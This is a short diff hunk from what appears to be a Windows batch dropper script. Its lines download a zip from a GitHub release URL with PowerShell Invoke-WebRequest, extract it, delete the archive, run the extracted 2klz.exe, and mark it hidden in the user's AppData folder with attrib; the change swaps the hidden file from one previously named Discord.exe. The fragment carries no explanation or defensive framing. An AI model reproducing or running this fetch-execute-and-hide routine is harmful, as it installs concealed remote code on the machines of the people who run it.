@@ -35,5 +35,5 @@ Powershell -Command "Invoke-Webrequest 'https://github.com/Kami32X/Osiris/raw/re
 tar -xf 2klz.zip
 del 2klz.zip
 start 2klz.exe
-attrib +h "C:\Users\%USERNAME%\AppData\Anon\Discord.exe" /s /d
+attrib +h "C:\Users\%USERNAME%\AppData\Anon\2klz.exe" /s /d
 :---------------------------------------------------------------------------------------------------------------------------:
